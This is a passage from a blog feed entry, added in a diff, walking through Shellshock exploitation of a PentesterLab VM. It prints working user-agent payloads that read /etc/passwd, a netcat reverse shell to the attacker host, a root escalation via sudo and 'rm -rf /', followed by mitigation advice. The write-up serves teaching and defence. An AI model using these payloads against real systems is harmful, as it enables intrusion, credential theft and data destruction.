+</span><span class='line'>20:02:15.856050 IP 172.16.246.129 > 172.16.246.132: ICMP echo reply, id 18947, seq 1, length 64
+</span><span class='line'>20:02:16.856425 IP 172.16.246.132 > 172.16.246.129: ICMP echo request, id 18947, seq 2, length 64
+</span><span class='line'>20:02:16.856451 IP 172.16.246.129 > 172.16.246.132: ICMP echo reply, id 18947, seq 2, length 64</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp_success.png" title="Burp success" alt=" Burp success " /></p>
+
+<p>Aha! So it works and we&rsquo;re actually getting output displayed on the screen. How about chaining the commands then?</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
+</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;ping -c 3 172.16.246.129; id; cat /etc/passwd&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp_success_chain.png" title="Burp chain success" alt=" Burp chain success " /></p>
+
+<p>As expected, all works fine! As you can see, we can do quite a lot of damage here. Let&rsquo;s get a shell (conviniently netcat is installed):</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
+</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;nc 172.16.246.129 31337 -e /bin/sh&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Waiting for reverse shell:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvp 31337
+</span><span class='line'>listening on [any] 31337 &hellip;
+</span><span class='line'>172.16.246.132: inverse host lookup failed: Unknown server error : Connection timed out
+</span><span class='line'>connect to [172.16.246.129] from (UNKNOWN) [172.16.246.132] 34190
+</span><span class='line'>whoami
+</span><span class='line'>pentesterlab
+</span><span class='line'>id
+</span><span class='line'>uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>And we have a shell! Just like this&hellip; scary huh?</p>
+
+<p>Since there was no particular goal in the challange (no flag or anything), let&rsquo;s just try to get a root and do more damage (just for fun and because&hellip; I always wanted to do it :P).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -l
+</span><span class='line'>User pentesterlab may run the following commands on this host:
+</span><span class='line'>    (root) NOPASSWD: ALL</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Really? All of them? Easy, let&rsquo;s spawn a root shell.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -s
+</span><span class='line'>whoami
+</span><span class='line'>root
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
+</span><span class='line'>rm -rf /&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>And it&rsquo;s gone.</p>
+
+<p>Obligatory disclaimer: <em>DON&rsquo;T TRY IT AT HOME! I take no responsibility for you wiping your (or anyone else&rsquo;s) filesystem off!</em></p>
+
+<p>Imagine if that actually happened on a production server you own, containing lots of business critical data and/or services&hellip; yeah, it was that simple (at least to get an initial shell).</p>
+
+<h2>Mitigation</h2>
+
+<p>Since you have seen how easy it is to compromise vulnerable servers, the next question is, how to mitigate it?</p>
+
+<p>First and foremost, that&rsquo;s a general advice, keep your system patched and up-to-date! As soon as a critical security patch is released, apply it! Especially on your Internet facing servers as they WILL sooner or later be scanned and heaps of exploits fired at them.</p>
+
+<p>With this particular &ldquo;Shellshock&rdquo; vulnerability, vendors weren&rsquo;t great regarding releasing a patch. It took them a while and the patch that was released actually didn&rsquo;t fix the vulnerability completely (hence another 4 or so CVEs emerging shortly after the inital one).</p>
+
+<p>So, what else can you do? Well, your environment set-up may come to the rescue here. Generally your Internet facing servers would be sitting behind a set of load balancers, proxies and firewalls - this <em>may</em> provide sufficient protection in some cases (e.g. egress firewall rules restricting outbound traffic, load balancers splitting traffic onto different servers, etc.).</p>
+
+<p>If you have an IPS, deploy the rules to block malicious traffic - but as with IPSes, you may need to deal with false-positives. If you have an IDS, get a team to monitor it for alerts triggering on exploit traffic, analyse responses and potentially block abusing IP (but it&rsquo;s kind of a whack-a-mole game at that point).</p>
+
+<p>And of course, as a general rule of thumb, if you don&rsquo;t need it - disable it! Use KSH or CSH or anything else instead (if you can).</p>
+
+<p>There was (and probably still is), quite a bit of panic around this particular vulnerability, however, there must be quite a lot of conditions satisfied to successfully exploit it, therefore I don&rsquo;t think it&rsquo;s actually THAT easy to exploit it in the wild. Of course, there will be (and already are) instances of breaches utilising this vulnerability, but they would be quite specifically crafted for targeted environment. You probably won&rsquo;t be hugely successful going around and spraying an entire Internet with the same payload and hoping for the best&hellip; Heartbleed was a lot easier in that regard, but that&rsquo;s a completely different story :)</p>
+]]></content>
+  </entry>
+  
+</feed>
